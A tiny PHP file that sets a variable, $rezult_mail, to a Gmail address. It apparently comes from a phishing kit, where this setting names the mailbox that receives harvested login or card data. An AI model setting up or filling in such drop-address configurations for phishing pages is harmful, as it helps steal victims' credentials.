<?php 
$rezult_mail="panampungbarubaru@gmail.com";
?>